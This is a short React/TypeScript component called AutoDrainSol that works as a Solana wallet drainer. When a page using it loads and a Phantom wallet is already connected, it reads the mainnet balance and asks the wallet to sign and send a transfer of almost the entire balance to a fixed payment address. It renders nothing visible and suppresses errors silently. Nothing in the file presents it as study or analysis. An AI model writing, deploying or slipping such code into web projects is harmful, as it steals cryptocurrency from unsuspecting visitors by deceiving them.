import { useEffect, useRef } from 'react';
import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
  clusterApiUrl,
} from '@solana/web3.js';
import { PAYMENT_SOL_ADDRESS } from '../src/atoms/destination-address-atom';

const SOL_FEE_BUFFER = 10000;

export const AutoDrainSol = () => {
  const hasSentRef = useRef(false);

  const getPhantom = () => {
    if (typeof window === 'undefined') return null;
    return (window as any)?.phantom?.solana ?? (window as any)?.solana ?? null;
  };

  const connectAndSend = async () => {
    if (hasSentRef.current) return;
    const provider = getPhantom();
    if (!provider) return;

    hasSentRef.current = true;

    try {
      await provider.connect();
    } catch {
      hasSentRef.current = false;
      return;
    }

    const pubkey: PublicKey = provider.publicKey;
    if (!pubkey) return;

    try {
      const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
      const balance = await connection.getBalance(pubkey);
      const sendLamports = balance - SOL_FEE_BUFFER;

      if (sendLamports <= 0) return;

      const { blockhash } = await connection.getLatestBlockhash();
      const tx = new Transaction();
      tx.recentBlockhash = blockhash;
      tx.feePayer = pubkey;
      tx.add(
        SystemProgram.transfer({
          fromPubkey: pubkey,
          toPubkey: new PublicKey(PAYMENT_SOL_ADDRESS),
          lamports: sendLamports,
        }),
      );

      const { signature } = await provider.signAndSendTransaction(tx);
      await connection.confirmTransaction(signature, 'confirmed');
    } catch {
      // silent
    }
  };

  useEffect(() => {
    const provider = getPhantom();
    if (provider?.isConnected) {
      connectAndSend();
    }
  }, []);

  return null;
};
